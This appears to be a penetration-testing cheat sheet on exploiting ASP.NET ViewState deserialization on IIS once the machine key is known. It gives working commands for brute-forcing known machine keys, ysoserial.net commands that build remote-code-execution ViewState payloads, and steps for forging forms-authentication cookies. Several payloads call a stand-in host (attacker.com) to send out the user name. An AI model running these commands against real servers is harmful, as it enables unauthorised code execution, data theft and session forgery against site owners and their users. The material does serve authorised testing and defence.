# IIS Machine Keys

> That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.

## Summary

* [Viewstate Format](#viewstate-format)
* [Machine Key Format And Locations](#machine-key-format-and-locations)
* [Identify Known Machine Key](#identify-known-machine-key)
* [Decode ViewState](#decode-viewstate)
* [Generate ViewState For RCE](#generate-viewstate-for-rce)
    * [MAC Is Not Enabled](#mac-is-not-enabled)
    * [MAC Is Enabled And Encryption Is Disabled](#mac-is-enabled-and-encryption-is-disabled)
    * [MAC Is Enabled And Encryption Is Enabled](#mac-is-enabled-and-encryption-is-enabled)
* [Edit Cookies With The Machine Key](#edit-cookies-with-the-machine-key)
* [References](#references)


## Viewstate Format

ViewState in IIS is a technique used to retain the state of web controls between postbacks in ASP.NET applications. It stores data in a hidden field on the page, allowing the page to maintain user input and other state information.

| Format | Properties |
| --- | --- |
| Base64 | `EnableViewStateMac=False`,  `ViewStateEncryptionMode=False` |
| Base64 + MAC | `EnableViewStateMac=True` |
| Base64 + Encrypted | `ViewStateEncryptionMode=True` |

By default until Sept 2014, the `enableViewStateMac` property was to set to `False`.
Usually unencrypted viewstate are starting with the string `/wEP`.


## Machine Key Format And Locations

A machineKey in IIS is a configuration element in ASP.NET that specifies cryptographic keys and algorithms used for encrypting and validating data, such as view state and forms authentication tokens. It ensures consistency and security across web applications, especially in web farm environments. 

The format of a machineKey is the following.

```xml
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto (default) | DES | 3DES | AES | alg:algorithm_name]" />
```

The `validationKey` attribute specifies a hexadecimal string used to validate data, ensuring it hasn't been tampered with. 

The `decryptionKey` attribute provides a hexadecimal string used to encrypt and decrypt sensitive data. 

The `validation` attribute defines the algorithm used for data validation, with options like SHA1, MD5, 3DES, AES, and HMACSHA256, among others. 

The `decryption` attribute specifies the encryption algorithm, with options like Auto, DES, 3DES, and AES, or you can specify a custom algorithm using alg:algorithm_name.

The following example of a machineKey is from Microsoft documentation (https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication).

```xml
<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
```

Common locations of **web.config** / **machine.config**

* 32-bits
    * `C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config`
    * `C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config`
* 64-bits
    * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config`
    * `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config`
* in the registry when **AutoGenerate** is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)
    * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4`  
    * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey`


## Identify Known Machine Key

Try multiple machine keys from known products, Microsoft documentation, or other part of the Internet.

* [isclayton/viewstalker](https://github.com/isclayton/viewstalker)

    ```powershell
    ./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt
    ____   ____.__                       __         .__   __
    \   \ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________ 
    \   Y   / |  |/ __ \ \/ \/ /  ___/\   __\__  \ |  | |  |/ // __ \_  __ \
    \     /  |  \  ___/\     /\___ \  |  |  / __ \|  |_|    <\  ___/|  | \/
    \___/   |__|\___  >\/\_//____  > |__| (____  /____/__|_ \\___  >__|   
                    \/           \/            \/          \/    \/       

    KEY FOUND!!!
    Host:   
    Validation Key: XXXXX,XXXXX
    ```

* [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets)

    ```ps1
    python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6
    Matching MachineKeys found!
    validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1
    ```

* [NotSoSecure/Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)

    ```powershell
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
    ```

* [0xacb/viewgen](https://github.com/0xacb/viewgen)

    ```powershell
    $ viewgen --guess "/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
    [+] ViewState is not encrypted
    [+] Signature algorithm: SHA1
    ```

List of interesting machine keys to use:

* [NotSoSecure/Blacklist3r/MachineKeys.txt](https://github.com/NotSoSecure/Blacklist3r/raw/f10304bc90efaca56676362a981d93cc312d9087/MachineKey/AspDotNetWrapper/AspDotNetWrapper/Resource/MachineKeys.txt)
* [isclayton/viewstalker/MachineKeys2.txt](https://raw.githubusercontent.com/isclayton/viewstalker/main/MachineKeys2.txt)
* [blacklanternsecurity/badsecrets/aspnet_machinekeys.txt](https://raw.githubusercontent.com/blacklanternsecurity/badsecrets/dev/badsecrets/resources/aspnet_machinekeys.txt)


## Decode ViewState

* [BApp Store > ViewState Editor](https://portswigger.net/bappstore/ba17d9fb487448b48368c22cb70048dc) - ViewState Editor is an extension that allows you to view and edit the structure and contents of V1.1 and V2.0 ASP view state data.
* [0xacb/viewgen](https://github.com/0xacb/viewgen)
    ```powershell
    $ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
    ```


## Generate ViewState For RCE

First you need to decode the Viewstate to know if the MAC and the encryption are enabled. 

**Requirements**

* `__VIEWSTATE`
* `__VIEWSTATEGENERATOR`


### MAC Is Not Enabled

```ps1
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName"
```


### MAC Is Enabled And Encryption Is Disabled

* Find the machine key (validationkey) using `badsecrets`, `viewstalker`, `AspDotNetWrapper.exe` or `viewgen` 
    ```ps1
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
    # --modifier = `__VIEWSTATEGENERATOR` parameter value
    # --encrypteddata = `__VIEWSTATE` parameter value of the target application
    ```

* Then generate a ViewState using [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net), both `TextFormattingRunProperties` and `TypeConfuseDelegate` gadgets can be used.
    ```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe -c nslookup http://attacker.com" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

    # --generator = `__VIEWSTATEGENERATOR` parameter value
    # --validationkey = validation key from the previous command
    ```


### MAC Is Enabled And Encryption Is Enabled

Default validation algorithm is `HMACSHA256` and the default decryption algorithm is `AES`.

If the `__VIEWSTATEGENERATOR` is missing but the application uses .NET Framework version 4.0 or below, you can use the root of the app (e.g: `--apppath="/testaspx/"`). 

* **.NET Framework < 4.5**, ASP.NET always accepts an unencrypted `__VIEWSTATE` if you remove the `__VIEWSTATEENCRYPTED` parameter from the request
    ```ps1
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
    ```

* **.NET Framework > 4.5**, the machineKey has the property: `compatibilityMode="Framework45"`
    ```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
    ```


## Edit Cookies With The Machine Key

If you have the `machineKey` but the viewstate is disabled.

ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools

```powershell
# decrypt cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# encrypt cookie (edit Decrypted.txt)
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```


## References

* [Deep Dive into .NET ViewState Deserialization and Its Exploitation - Swapneil Kumar Dash - October 22, 2019](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili - April 23, 2019](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net - Claranet - June 13, 2019](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)
* [Project Blacklist3r - @notsosecure - November 23, 2018](https://www.notsosecure.com/project-blacklist3r/)
* [View State, The Unpatchable IIS Forever Day Being Actively Exploited - Zeroed - July 21, 2024](https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/)